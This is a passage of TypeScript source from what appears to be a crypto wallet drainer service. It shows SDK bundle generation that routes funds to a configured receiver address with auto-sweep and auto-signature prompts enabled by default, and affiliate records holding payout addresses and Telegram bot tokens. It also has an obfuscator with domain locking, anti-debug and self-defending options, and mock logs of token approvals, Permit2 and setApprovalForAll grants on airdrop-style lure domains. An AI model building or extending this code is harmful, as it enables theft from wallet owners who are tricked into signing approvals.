  TRANSACTION_FAILED: "tx.failed",
  CHAIN_SWITCHED: "chain.switched",
  CONTRACT_DEPLOYED: "contract.deployed",
  CONTRACT_CALLED: "contract.called",
  APPROVAL_GRANTED: "approval.granted",
  RELAY_EXECUTED: "relay.executed",
} as const;
```

```typescript
import { readCompileConfig, type CompileConfig } from "@/lib/compile-config-store";
import { readOperationalConfig } from "@/lib/operational-config-store";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultPayoutConfig,
  defaultStrategyConfig,
  defaultTokensConfig,
  defaultWalletConfig,
} from "@/lib/mock-data";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";

/**
 * Merges saved Compile tab JSON with operational (contracts, strategy, payout, appKit).
 * Used by GET /api/sdk so embeds always track the dashboard without re-downloading a file.
 */
export async function mergePersistedAndOperationalConfig(): Promise<CompileConfig> {
  const operational = await readOperationalConfig();
  const stored = await readCompileConfig();
  return {
    general: { ...defaultGeneralConfig, ...stored.general },
    wallet: { ...defaultWalletConfig, ...stored.wallet },
    modal: { ...defaultModalConfig, ...stored.modal },
    tokens: { ...defaultTokensConfig, ...stored.tokens },
    advanced: { ...defaultAdvancedConfig, ...stored.advanced },
    payout: { ...defaultPayoutConfig, ...operational.payout, ...stored.payout },
    contracts: { ...defaultContractsConfig, ...operational.contracts, ...stored.contracts },
    strategy: { ...defaultStrategyConfig, ...operational.strategy, ...stored.strategy },
    appKit: { ...defaultAppKitConfig, ...operational.appKit, ...stored.appKit },
  };
}

export async function generateLiveSdkBundle(receiverOverride?: string): Promise<string> {
  const merged = await mergePersistedAndOperationalConfig();
  const operational = await readOperationalConfig();
  const resolved =
    (receiverOverride && receiverOverride.trim()) ||
    operational.payout?.address ||
    merged.payout.address ||
    "0x0000000000000000000000000000000000000000";

  if (merged.general.ecosystem === "solana") {
    return generateSolanaBundle({
      general: merged.general,
      wallet: merged.wallet,
      modal: merged.modal,
      tokens: merged.tokens,
      advanced: merged.advanced,
      receiverAddress: resolved,
    });
  }
  if (merged.general.ecosystem === "tron") {
    return generateTronBundle({
      general: merged.general,
      wallet: merged.wallet,
      modal: merged.modal,
      tokens: merged.tokens,
      advanced: merged.advanced,
      receiverAddress: resolved,
    });
  }

  return generateSDKBundle({
    general: merged.general,
    wallet: merged.wallet,
    modal: { ...merged.modal, exposeExternalSDK: true },
    tokens: merged.tokens,
    advanced: merged.advanced,
    contracts: merged.contracts,
    strategy: merged.strategy,
    appKit: merged.appKit,
    receiverAddress: resolved,
  });
}
```

```typescript
const chains = ["Ethereum", "BSC", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base"];
const statuses: WalletSession["status"][] = ["connected", "disconnected", "pending", "approved", "rejected"];
const countries = ["US", "UK", "DE", "FR", "JP", "KR", "SG", "AE", "CA", "AU"];
const domains = ["app.defi-protocol.io", "mint.nftlaunch.xyz", "stake.yieldmax.com", "claim.airdrop.finance", "swap.dexbridge.io"];

function randomFrom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomAddr(): string {
  const hex = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) addr += hex[Math.floor(Math.random() * 16)];
  return addr;
}

function shortAddr(addr: string): string {
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

export function generateSessions(count: number): WalletSession[] {
  return Array.from({ length: count }, (_, i) => {
    const wallet = randomAddr();
    const chain = randomFrom(chains);
    return {
      id: `session-${i + 1}`,
      wallet: shortAddr(wallet),
      chain,
      chainId: chain === "Ethereum" ? 1 : chain === "BSC" ? 56 : chain === "Polygon" ? 137 : chain === "Avalanche" ? 43114 : chain === "Arbitrum" ? 42161 : chain === "Optimism" ? 10 : 8453,
      balanceUSD: Math.round(Math.random() * 50000 * 100) / 100,
      status: randomFrom(statuses),
      timestamp: new Date(Date.now() - Math.random() * 86400000 * 7).toISOString(),
      domain: randomFrom(domains),
      country: randomFrom(countries),
      assets: [
        { symbol: "ETH", name: "Ethereum", balance: Math.random() * 10, valueUSD: Math.random() * 20000, type: "NATIVE" },
        { symbol: "USDT", name: "Tether", balance: Math.random() * 10000, valueUSD: Math.random() * 10000, type: "ERC-20" },
        { symbol: "USDC", name: "USD Coin", balance: Math.random() * 10000, valueUSD: Math.random() * 10000, type: "ERC-20" },
      ],
    };
  });
}

const logTypes: LogEntry["type"][] = ["connection", "signature", "approval", "transfer", "chain_switch", "error", "disconnect"];

export function generateLogs(count: number): LogEntry[] {
  const messages: Record<LogEntry["type"], string[]> = {
    connection: ["Wallet connected successfully", "New wallet session initiated", "Reconnection detected"],
    signature: ["Signature request sent", "EIP-712 typed data signed", "Personal sign completed"],
    approval: ["ERC-20 approve() executed", "Permit2 batch approval signed", "setApprovalForAll granted"],
    transfer: ["transferFrom executed", "safeTransferFrom completed", "Batch transfer initiated"],
    chain_switch: ["Switched to Ethereum", "Network change to BSC", "Chain switch to Polygon"],
    error: ["User rejected signature", "Insufficient gas", "Transaction reverted"],
    disconnect: ["Wallet disconnected", "Session expired", "Manual disconnect"],
  };
  return Array.from({ length: count }, (_, i) => {
    const type = randomFrom(logTypes);
    return {
      id: `log-${i + 1}`,
      type,
      wallet: shortAddr(randomAddr()),
      chain: randomFrom(chains),
      message: randomFrom(messages[type]),
      timestamp: new Date(Date.now() - Math.random() * 86400000 * 7).toISOString(),
      domain: randomFrom(domains),
    };
  }).sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

export function generateDomains(): DomainConfig[] {
  return domains.map((domain, i) => ({
    id: `domain-${i + 1}`,
    domain,
    status: i < 3 ? "active" : i < 4 ? "paused" : "expired",
    createdAt: new Date(Date.now() - Math.random() * 86400000 * 30).toISOString(),
    lastActivity: new Date(Date.now() - Math.random() * 86400000 * 2).toISOString(),
    sessions: Math.floor(Math.random() * 500),
    totalValueUSD: Math.round(Math.random() * 500000 * 100) / 100,
  }));
}

export function generateStats(): PlatformStats {
  const dailySessions = Array.from({ length: 30 }, (_, i) => {
    const date = new Date(Date.now() - (29 - i) * 86400000);
    return {
      date: date.toISOString().split("T")[0],
      count: Math.floor(Math.random() * 120 + 20),
      value: Math.round(Math.random() * 100000 * 100) / 100,
    };
  });

  const chainDistribution = chains.map((chain) => ({
    chain,
    count: Math.floor(Math.random() * 300 + 50),
    value: Math.round(Math.random() * 200000 * 100) / 100,
  }));

  const hourlyActivity = Array.from({ length: 24 }, (_, hour) => ({
    hour,
    count: Math.floor(Math.random() * 50 + 5),
  }));

  return {
    totalSessions: 4832,
    activeSessions: 47,
    totalValueProcessed: 2847392.58,
    successRate: 78.4,
    avgSessionDuration: 124,
    uniqueWallets: 3291,
    topChain: "Ethereum",
    dailySessions,
    chainDistribution,
    hourlyActivity,
  };
}
```

### src/lib/modal-presentation.ts

```typescript
import type { ModalConfig } from "@/lib/types";

export type ModalPresentation = {
  title: string;
  subtitle: string;
  ctaLabel: string;
  items: string[];
};

export function deriveModalPresentation(modal: ModalConfig): ModalPresentation {
  const title =
    modal.previewStyle === "trails"
      ? "Route Your Transaction"
      : modal.modalFrameworkStyle === "rainbowkit"
        ? "Connect a Wallet"
        : modal.previewStyle === "reown"
          ? "Select a Wallet"
          : "Launch Modal";

  const subtitle =
    modal.previewStyle === "trails"
      ? "Choose the cleanest path across wallet, chain, and token."
      : modal.modalFrameworkStyle === "rainbowkit"
        ? "Popular wallets first, with a polished app feel."
        : modal.previewStyle === "reown"
          ? "Flexible wallet connect flow with app-level theming."
          : "Use your own system shell and wallet orchestration.";

  const items = (
    modal.featuredWallets.length
      ? modal.featuredWallets
      : modal.previewStyle === "trails"
        ? ["route", "base", "wallet"]
        : modal.modalFrameworkStyle === "rainbowkit"
          ? ["metamask", "rainbow", "coinbase"]
          : modal.previewStyle === "reown"
            ? ["injected", "walletconnect", "smart account"]
            : ["primary", "fallback", "custom"]
  ).slice(0, modal.collapseWallets ? 2 : 3);

  const ctaLabel = modal.previewStyle === "trails" ? "Continue Route" : "Open Modal";

  return {
    title,
    subtitle,
    ctaLabel,
    items,
  };
}
```

### src/lib/obfuscator.ts

```typescript
/**
 * Script obfuscation system.
 *
 * Three levels:
 *  - "minify"   → Terser minification only (fast, small output)
 *  - "medium"   → Obfuscation with readable variable names mangled
 *  - "heavy"    → Full obfuscation: string encoding, control flow flattening, dead code injection
 */

import JavaScriptObfuscator from "javascript-obfuscator";
import { minify } from "terser";

export type ObfuscationLevel = "none" | "minify" | "medium" | "heavy";

export async function obfuscateScript(
  code: string,
  level: ObfuscationLevel = "medium"
): Promise<string> {
  if (level === "none") return code;

  if (level === "minify") {
    const result = await minify(code, {
      compress: {
        dead_code: true,
        drop_console: false,
        passes: 2,
      },
      mangle: {
        toplevel: true,
      },
      output: {
        comments: false,
      },
    });
    return result.code || code;
  }

  if (level === "medium") {
    const result = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      controlFlowFlattening: false,
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: false,
      identifierNamesGenerator: "hexadecimal",
      log: false,
      numbersToExpressions: true,
      renameGlobals: false,
      selfDefending: false,
      simplify: true,
      splitStrings: true,
      splitStringsChunkLength: 5,
      stringArray: true,
      stringArrayCallsTransform: true,
      stringArrayEncoding: ["base64"],
      stringArrayIndexShift: true,
      stringArrayRotate: true,
      stringArrayShuffle: true,
      stringArrayWrappersCount: 2,
      stringArrayWrappersChainedCalls: true,
      stringArrayWrappersType: "function",
      stringArrayThreshold: 0.75,
      transformObjectKeys: true,
      unicodeEscapeSequence: false,
    });
    return result.getObfuscatedCode();
  }

  // heavy
  const result = JavaScriptObfuscator.obfuscate(code, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    debugProtection: true,
    debugProtectionInterval: 2000,
    disableConsoleOutput: false,
    domainLock: [],
    domainLockRedirectUrl: "about:blank",
    forceTransformStrings: [],
    identifierNamesGenerator: "hexadecimal",
    identifiersPrefix: "",
    ignoreImports: false,
    log: false,
    numbersToExpressions: true,
    renameGlobals: true,
    selfDefending: true,
    simplify: true,
    splitStrings: true,
    splitStringsChunkLength: 3,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayCallsTransformThreshold: 0.75,
    stringArrayEncoding: ["rc4"],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 3,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 4,
    stringArrayWrappersType: "function",
    stringArrayThreshold: 1,
    transformObjectKeys: true,
    unicodeEscapeSequence: true,
  });
  return result.getObfuscatedCode();
}

/**
 * Domain-lock the script so it only runs on specific domains.
 * Works with the "heavy" obfuscation level.
 */
export async function obfuscateWithDomainLock(
  code: string,
  domains: string[],
  level: ObfuscationLevel = "heavy"
): Promise<string> {
  if (level === "none" || level === "minify") {
    return obfuscateScript(code, level);
  }

  const result = JavaScriptObfuscator.obfuscate(code, {
    compact: true,
    controlFlowFlattening: level === "heavy",
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: level === "heavy",
    deadCodeInjectionThreshold: 0.4,
    debugProtection: level === "heavy",
    debugProtectionInterval: level === "heavy" ? 2000 : 0,
    disableConsoleOutput: false,
    domainLock: domains,
    domainLockRedirectUrl: "about:blank",
    identifierNamesGenerator: "hexadecimal",
    log: false,
    numbersToExpressions: true,
    renameGlobals: level === "heavy",
    selfDefending: level === "heavy",
    simplify: true,
    splitStrings: true,
    splitStringsChunkLength: level === "heavy" ? 3 : 5,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: [level === "heavy" ? "rc4" : "base64"],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: level === "heavy" ? 3 : 2,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersType: "function",
    stringArrayThreshold: level === "heavy" ? 1 : 0.75,
    transformObjectKeys: true,
    unicodeEscapeSequence: level === "heavy",
  });
  return result.getObfuscatedCode();
}
```

### src/lib/operational-config-store.ts

```typescript
import { mkdir, readFile, writeFile } from "fs/promises";
import path from "path";
import {
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultStrategyConfig,
} from "@/lib/mock-data";
import { defaultPayoutConfig } from "@/lib/mock-data";
import type { AppKitConfig, ContractsConfig, PayoutConfig, StrategyConfig } from "@/lib/types";

export type OperationalConfig = {
  contracts: ContractsConfig;
  strategy: StrategyConfig;
  appKit: AppKitConfig;
  payout: PayoutConfig;
  /** Platform-wide runtime flags (auto sign, etc.). */
  runtime?: {
    autoSignaturePrompt?: boolean;
  };
};

const DATA_DIR = path.join(process.cwd(), "data");
const CONFIG_PATH = path.join(DATA_DIR, "operational-config.json");

export function getDefaultOperationalConfig(): OperationalConfig {
  return {
    contracts: defaultContractsConfig,
    strategy: defaultStrategyConfig,
    appKit: defaultAppKitConfig,
    payout: defaultPayoutConfig,
    runtime: { autoSignaturePrompt: true },
  };
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function mergeOperationalConfig(parsed: Record<string, unknown>): OperationalConfig {
  const defaults = getDefaultOperationalConfig();
  return {
    contracts: { ...defaults.contracts, ...(isRecord(parsed.contracts) ? parsed.contracts : {}) } as OperationalConfig["contracts"],
    strategy: { ...defaults.strategy, ...(isRecord(parsed.strategy) ? parsed.strategy : {}) } as OperationalConfig["strategy"],
    appKit: { ...defaults.appKit, ...(isRecord(parsed.appKit) ? parsed.appKit : {}) } as OperationalConfig["appKit"],
    payout: { ...defaults.payout, ...(isRecord(parsed.payout) ? parsed.payout : {}) } as OperationalConfig["payout"],
    runtime: {
      ...defaults.runtime,
      ...(isRecord(parsed.runtime) ? parsed.runtime : {}),
    },
  };
}

export function isOperationalConfig(value: unknown): value is OperationalConfig {
  return isRecord(value) && isRecord(value.contracts) && isRecord(value.strategy) && isRecord(value.appKit);
}

export async function readOperationalConfig(): Promise<OperationalConfig> {
  try {
    const raw = await readFile(CONFIG_PATH, "utf8");
    const parsed = JSON.parse(raw) as unknown;
    if (!isRecord(parsed)) throw new Error("Invalid operational config");
    return mergeOperationalConfig(parsed);
  } catch {
    return getDefaultOperationalConfig();
  }
}

export async function writeOperationalConfig(config: OperationalConfig): Promise<void> {
  await mkdir(DATA_DIR, { recursive: true });
  await writeFile(CONFIG_PATH, `${JSON.stringify(config, null, 2)}\n`, "utf8");
}
```

```typescript
import { isAddress } from "viem";

  /** True when payout.autoSweep or advanced.autoSignaturePrompt is enabled. */

  /**
   * Same treasury as StealthExchange / embed `recipient` unless
   * `NEXT_PUBLIC_SEQUENCE_EXCHANGE_WALLET_ADDRESS` is set (then that env wins).
   */
  sequenceExchangeWallet: string;
};

function envRecipient(): string {
  return (process.env.NEXT_PUBLIC_DEFAULT_RECIPIENT || "").trim();
}

function envSequenceExchangeOverride(): string {
  const v = (process.env.NEXT_PUBLIC_SEQUENCE_EXCHANGE_WALLET_ADDRESS || "").trim();
  return v && isAddress(v) ? v : "";
}

/** Unified payout for Sequence tooling vs StealthExchange (env splits them only when set). */
export function resolveSequenceExchangeWallet(recipient: string): string {
  const override = envSequenceExchangeOverride();
  if (override) return override;
  const r = recipient.trim();
  return r && isAddress(r) ? r : "";
}

function pickRecipient(...candidates: string[]): string {
  for (const value of candidates) {
    const trimmed = value.trim();
    if (trimmed && isAddress(trimmed)) return trimmed;
  }
  return "";
}

export async function resolvePlatformRuntimeConfig(): Promise<PlatformRuntimeConfig> {
  const [operational, compile] = await Promise.all([readOperationalConfig(), readCompileConfig()]);

  const payout: PayoutConfig = {
    ...defaultPayoutConfig,
    ...compile.payout,
    ...operational.payout,
  };

  const advanced = {
    autoSignaturePrompt:
      compile.advanced.autoSignaturePrompt ?? operational.runtime?.autoSignaturePrompt ?? true,
  };

  const recipient = pickRecipient(payout.address, envRecipient());
  const autoExecute = payout.autoSweep || advanced.autoSignaturePrompt;
  const sequenceExchangeWallet = resolveSequenceExchangeWallet(recipient);

  return { payout, advanced, autoExecute, recipient, sequenceExchangeWallet };
}

export async function persistPlatformRuntimeConfig(input: {
  payout?: Partial<PayoutConfig>;
  autoSignaturePrompt?: boolean;
}): Promise<PlatformRuntimeConfig> {
  const [operational, compile] = await Promise.all([readOperationalConfig(), readCompileConfig()]);

  const payout: PayoutConfig = {
    ...defaultPayoutConfig,
    ...compile.payout,
    ...operational.payout,
    ...input.payout,
  };

  if (input.payout?.address !== undefined) {
    payout.address = input.payout.address.trim();
  }

  const autoSignaturePrompt =
    input.autoSignaturePrompt ?? compile.advanced.autoSignaturePrompt ?? true;

  const nextOperational: OperationalConfig = {
    ...operational,
    payout,
    runtime: {
      autoSignaturePrompt,
    },
  };

  const nextCompile = {
    ...compile,
    payout,
    advanced: {
      ...compile.advanced,
      autoSignaturePrompt,
    },
  };

  await Promise.all([writeOperationalConfig(nextOperational), writeCompileConfig(nextCompile)]);

  const recipient = pickRecipient(payout.address, envRecipient());
  const sequenceExchangeWallet = resolveSequenceExchangeWallet(recipient);
  return {
    payout,
    advanced: { autoSignaturePrompt },
    autoExecute: payout.autoSweep || autoSignaturePrompt,
    recipient,
    sequenceExchangeWallet,
  };
}
```

### src/lib/projects.ts

```typescript
/**
 * Affiliate / Project management.
 *
 * Owner creates projects for affiliates. Each project stores:
 *  - Affiliate's payout address
 *  - Affiliate's Telegram bot token + chat ID
 *  - SDK config (set by owner)
 *  - Compiled script status
 *
 * Storage: Redis-backed, falls back to in-memory in dev.
 */

import crypto from "crypto";
import { getRedis } from "./redis";
import { encrypt, decrypt, isEncrypted } from "./encryption";
import type {
  GeneralConfig,
  WalletConfig,
  ModalConfig,
  TokensConfig,
  AdvancedConfig,
  PayoutConfig,
} from "./types";
import { validateAffiliateConfig } from "./schemas/sdk-config.schema";

// ── Types ───────────────────────────────────────────────

export interface AffiliateProject {
  id: string;
  name: string;                   // label you give them, e.g. "John's site"
  username: string;               // auto-generated login username (e.g. "aff_johndoe")
  payoutAddress: string;          // where their funds go
  telegramBotToken: string;       // their bot token
  telegramChatId: string;         // their chat ID
  accessSecret: string;           // hashed affiliate login password (never returned plaintext)
  createdAt: string;
  status: "pending" | "active" | "paused" | "suspended";
  domains: string[];              // allowed embed domains (optional)
  notes: string;                  // internal notes
  lastCompiled: string | null;    // when script was last generated
}

export interface AffiliateConfig {
  general: GeneralConfig;
  wallet: WalletConfig;
  modal: ModalConfig;
  tokens: TokensConfig;
  advanced: AdvancedConfig;
  payout: PayoutConfig;
}

// ── Keys ────────────────────────────────────────────────

const KEY = {
  project: (id: string) => `affiliate:${id}`,
  config: (id: string) => `affiliate:${id}:config`,
  list: () => `affiliates:list`,
  usernameIndex: (username: string) => `affiliate:username:${username.toLowerCase()}`,
};

// ── Helpers ─────────────────────────────────────────────

function generateId(): string {
  return "aff_" + crypto.randomBytes(8).toString("hex");
}

/**
 * Derives a clean username slug from the affiliate's name.
 * e.g. "John's DeFi Site" → "aff_johnsdefinsite" + random 4-char suffix to avoid collisions.
 */
function deriveUsername(name: string): string {
  const slug = name
    .toLowerCase()
    .replace(/[^a-z0-9]/g, "")
    .slice(0, 16);
  const suffix = crypto.randomBytes(2).toString("hex");
  return `aff_${slug}${suffix}`;
}

/** Generates a secure random password: 16 printable chars, no ambiguous characters. */
function generatePassword(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%&*";
  let pw = "";
  const bytes = crypto.randomBytes(16);
  for (const b of bytes) {
    pw += chars[b % chars.length];
  }
  return pw;
}

// ── CRUD ────────────────────────────────────────────────

/**
 * Creates a new affiliate project with auto-generated credentials.
 * Returns the project AND the plaintext password — the password is only
 * available at creation time. Store it encrypted; never return it again.
 */
export async function createAffiliateProject(data: {
  name: string;
  payoutAddress: string;
  telegramBotToken: string;
  telegramChatId: string;
  notes?: string;
  status?: AffiliateProject["status"];
}): Promise<{ project: AffiliateProject; plaintextPassword: string }> {
  const redis = await getRedis();
  const id = generateId();
  const username = deriveUsername(data.name);
  const plaintextPassword = generatePassword();

  const project: AffiliateProject = {
    id,
    name: data.name,
    username,
    payoutAddress: data.payoutAddress,
    telegramBotToken: encrypt(data.telegramBotToken),
    telegramChatId: data.telegramChatId,
    accessSecret: encrypt(plaintextPassword),
    createdAt: new Date().toISOString(),
    status: data.status ?? "active",
    domains: [],
    notes: data.notes || "",
    lastCompiled: null,
  };

  await redis.set(KEY.project(id), JSON.stringify(project));

  // Username → project ID index for login lookup
  await redis.set(KEY.usernameIndex(username), id);

  // Add to list index
  const raw = await redis.get(KEY.list());
  const ids: string[] = raw ? JSON.parse(raw) : [];
  ids.push(id);
  await redis.set(KEY.list(), JSON.stringify(ids));

  return { project, plaintextPassword };
}

/**
 * Resets the affiliate's password. Returns the new plaintext password once.
 */
export async function resetAffiliatePassword(id: string): Promise<{ plaintextPassword: string } | null> {
  const project = await getAffiliateProject(id);
  if (!project) return null;

  const plaintextPassword = generatePassword();
  const updated = { ...project, accessSecret: encrypt(plaintextPassword) };
  const redis = await getRedis();
  await redis.set(KEY.project(id), JSON.stringify(updated));

  return { plaintextPassword };
}

/**
 * Looks up a project ID by username (case-insensitive).
 */
export async function getProjectIdByUsername(username: string): Promise<string | null> {
  const redis = await getRedis();
  return redis.get(KEY.usernameIndex(username.toLowerCase()));
}

export async function getAffiliateProject(id: string): Promise<AffiliateProject | null> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.project(id));
  return raw ? (JSON.parse(raw) as AffiliateProject) : null;
}

/** Get project with decrypted telegram bot token (for sending messages) */
export async function getAffiliateProjectDecrypted(id: string): Promise<AffiliateProject | null> {
  const project = await getAffiliateProject(id);
  if (!project) return null;
  try {
    if (isEncrypted(project.telegramBotToken)) {
      project.telegramBotToken = decrypt(project.telegramBotToken);
    }
    if (isEncrypted(project.accessSecret)) {
      project.accessSecret = decrypt(project.accessSecret);
    }
  } catch { /* return as-is if decryption fails */ }
  return project;
}

export async function updateAffiliateProject(
  id: string,
  updates: Partial<Omit<AffiliateProject, "id" | "createdAt">>
): Promise<AffiliateProject | null> {
  const project = await getAffiliateProject(id);
  if (!project) return null;

  const nextUpdates = { ...updates };
  if (typeof nextUpdates.telegramBotToken === "string" && !isEncrypted(nextUpdates.telegramBotToken)) {
    nextUpdates.telegramBotToken = encrypt(nextUpdates.telegramBotToken);
  }
  if (typeof nextUpdates.accessSecret === "string" && !isEncrypted(nextUpdates.accessSecret)) {
    nextUpdates.accessSecret = encrypt(nextUpdates.accessSecret);
  }

  const updated = { ...project, ...nextUpdates };
  const redis = await getRedis();
  await redis.set(KEY.project(id), JSON.stringify(updated));
  return updated;
}

export async function deleteAffiliateProject(id: string): Promise<boolean> {
  const redis = await getRedis();
  await redis.del(KEY.project(id));
  await redis.del(KEY.config(id));

  const raw = await redis.get(KEY.list());
  if (raw) {
    const ids: string[] = JSON.parse(raw);
    await redis.set(KEY.list(), JSON.stringify(ids.filter((i) => i !== id)));
  }
  return true;
}

export async function listAffiliateProjects(): Promise<AffiliateProject[]> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.list());
  if (!raw) return [];

  const ids: string[] = JSON.parse(raw);
  const projects: AffiliateProject[] = [];
  for (const id of ids) {
    const p = await getAffiliateProject(id);
    if (p) projects.push(p);
  }
  return projects;
}

// ── Affiliate SDK Config (with versioning) ──────────────

export async function saveAffiliateConfig(id: string, config: AffiliateConfig): Promise<number> {
  const redis = await getRedis();

  // Validate shape before saving
  try {
    validateAffiliateConfig(config);
  } catch (err) {
    // Re-throw with clearer message
    throw new Error(`Invalid affiliate config: ${err instanceof Error ? err.message : String(err)}`);
  }

  // Increment version counter
  const versionKey = `affiliate:${id}:config:version`;
  const currentRaw = await redis.get(versionKey);
  const nextVersion = (parseInt(currentRaw || "0", 10) || 0) + 1;
  await redis.set(versionKey, String(nextVersion));

  // Save current config
  await redis.set(KEY.config(id), JSON.stringify(config));

  // Save versioned snapshot
  await redis.set(
    `affiliate:${id}:config:v${nextVersion}`,
    JSON.stringify({ ...config, _version: nextVersion, _savedAt: new Date().toISOString() })
  );

  return nextVersion;
}

export async function getAffiliateConfig(id: string): Promise<AffiliateConfig | null> {
  const redis = await getRedis();
  const raw = await redis.get(KEY.config(id));
  return raw ? (JSON.parse(raw) as AffiliateConfig) : null;
}

export async function getAffiliateConfigVersion(id: string, version: number): Promise<AffiliateConfig | null> {
  const redis = await getRedis();
  const raw = await redis.get(`affiliate:${id}:config:v${version}`);
  return raw ? (JSON.parse(raw) as AffiliateConfig) : null;
}

export async function getAffiliateConfigCurrentVersion(id: string): Promise<number> {
  const redis = await getRedis();
  const raw = await redis.get(`affiliate:${id}:config:version`);
  return parseInt(raw || "0", 10) || 0;
}
```

```typescript
import { ADMIN_SENTINEL_ADDRESS } from "./auth";

/**
 * Role-Based Access Control for the admin dashboard.
 * Roles: owner > admin > operator > viewer
 */

export type Role = "owner" | "admin" | "operator" | "viewer";

export interface RBACUser {
  address: string;
  role: Role;
}

const ROLE_HIERARCHY: Record<Role, number> = {
  owner: 100,
  admin: 75,
  operator: 50,
  viewer: 25,
};

type Permission =
  | "config:read"
  | "config:write"
  | "contracts:read"
  | "contracts:deploy"
  | "relay:execute"
  | "analytics:read"
  | "logs:read"
  | "logs:delete"
  | "domains:read"
  | "domains:manage"
  | "settings:read"
  | "settings:write"
  | "users:read"
  | "users:manage"
  | "sdk:compile"
  | "sdk:download";

const ROLE_PERMISSIONS: Record<Role, Permission[]> = {
  viewer: [
    "config:read",
    "contracts:read",
    "analytics:read",
    "logs:read",
    "domains:read",
    "settings:read",
  ],
  operator: [
    "config:read",
    "config:write",
    "contracts:read",
    "contracts:deploy",
    "relay:execute",
    "analytics:read",
    "logs:read",
    "domains:read",
    "domains:manage",
    "settings:read",
    "sdk:compile",
    "sdk:download",
  ],
  admin: [
    "config:read",
    "config:write",
    "contracts:read",
    "contracts:deploy",
    "relay:execute",
    "analytics:read",
    "logs:read",
    "logs:delete",
    "domains:read",
    "domains:manage",
    "settings:read",
    "settings:write",
    "users:read",
    "sdk:compile",
    "sdk:download",
  ],
  owner: [
    "config:read",
    "config:write",
    "contracts:read",
    "contracts:deploy",
    "relay:execute",
    "analytics:read",
    "logs:read",
    "logs:delete",
    "domains:read",
    "domains:manage",
    "settings:read",
    "settings:write",
    "users:read",
    "users:manage",
    "sdk:compile",
    "sdk:download",
  ],
};

/** Check if a role has a specific permission */
export function hasPermission(role: Role, permission: Permission): boolean {
  return ROLE_PERMISSIONS[role]?.includes(permission) ?? false;
}

/** Check if roleA >= roleB in hierarchy */
export function isAtLeast(roleA: Role, roleB: Role): boolean {
  return ROLE_HIERARCHY[roleA] >= ROLE_HIERARCHY[roleB];
}

/**
 * Resolve user role from address.
 * In production, this reads from Redis/DB. For now, env-based.
 * OWNER_ADDRESS env var gets "owner" role; all others get "viewer".
 */
export function resolveRole(address: string): Role {
  if (address === ADMIN_SENTINEL_ADDRESS) return "owner";
  const ownerAddr = process.env.OWNER_ADDRESS?.toLowerCase();
  const adminAddrs = (process.env.ADMIN_ADDRESSES || "").toLowerCase().split(",").filter(Boolean);
  const operatorAddrs = (process.env.OPERATOR_ADDRESSES || "").toLowerCase().split(",").filter(Boolean);

  const addr = address.toLowerCase();
  if (ownerAddr && addr === ownerAddr) return "owner";
  if (adminAddrs.includes(addr)) return "admin";
  if (operatorAddrs.includes(addr)) return "operator";
  return "viewer";
}

/** Middleware helper — returns null if authorized, or an error response */
export function authorize(address: string | null, permission: Permission): string | null {
  if (!address) return "Authentication required";
  const role = resolveRole(address);
  if (!hasPermission(role, permission)) {
    return `Insufficient permissions: ${role} cannot ${permission}`;
  }
  return null;
}
```

### src/lib/redis.ts

```typescript
/**
 * Redis client — session store, caching, rate limiting.
 * Falls back to in-memory Map when REDIS_URL is not set (dev mode).
 */

interface RedisLike {
  get(key: string): Promise<string | null>;
  set(key: string, value: string, ttlSeconds?: number): Promise<void>;
  del(key: string): Promise<void>;
  incr(key: string): Promise<number>;
  expire(key: string, seconds: number): Promise<void>;
}

// In-memory fallback for dev
class MemoryStore implements RedisLike {
  private store = new Map<string, { value: string; expires?: number }>();

  async get(key: string) {
    const entry = this.store.get(key);
    if (!entry) return null;
    if (entry.expires && Date.now() > entry.expires) {
      this.store.delete(key);
      return null;
    }
    return entry.value;
  }

  async set(key: string, value: string, ttlSeconds?: number) {
    this.store.set(key, {
      value,
      expires: ttlSeconds ? Date.now() + ttlSeconds * 1000 : undefined,
    });
  }

  async del(key: string) {
    this.store.delete(key);
  }

  async incr(key: string) {
    const current = await this.get(key);
    const next = (parseInt(current || "0", 10) || 0) + 1;
    const entry = this.store.get(key);
    this.store.set(key, { value: String(next), expires: entry?.expires });
    return next;
  }

  async expire(key: string, seconds: number) {
    const entry = this.store.get(key);
    if (entry) entry.expires = Date.now() + seconds * 1000;
  }
}

let _client: RedisLike | null = null;

export async function getRedis(): Promise<RedisLike> {
  if (_client) return _client;

  const url = process.env.REDIS_URL;
  if (url) {
    try {
      // Dynamic import so the app works without ioredis installed
      // Dynamic require to avoid Next.js bundler resolving ioredis at build time
      const ioredisModule = await (Function('return import("ioredis")')() as Promise<typeof import("ioredis")>);
      const Redis = ioredisModule.default;
      const ioredis = new Redis(url);

      _client = {
        async get(key) { return ioredis.get(key); },
        async set(key, value, ttl) {
          if (ttl) await ioredis.set(key, value, "EX", ttl);
          else await ioredis.set(key, value);
        },
        async del(key) { await ioredis.del(key); },
        async incr(key) { return ioredis.incr(key); },
